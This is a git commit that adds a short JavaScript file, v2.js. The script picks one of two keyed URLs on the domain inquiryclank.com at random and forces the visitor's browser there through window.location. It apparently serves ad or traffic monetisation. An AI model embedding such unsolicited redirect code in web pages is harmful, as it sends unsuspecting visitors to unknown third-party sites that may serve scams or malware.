cca4aa63e6e8de1948da87046afe7451547d82c8
nvmz <114546532+nvmz@users.noreply.github.com>
2022-09-28 11:38:10 +0800

    Create v2.js

---
+++ v2.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+  '//inquiryclank.com/vg3vxwhsn?key=8f9b9642ec97f0124484fdc20f75f187',
+  '//inquiryclank.com/c8a0vref3i?key=2c3b76321c07ecd875d5c101ff8f0e6f'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
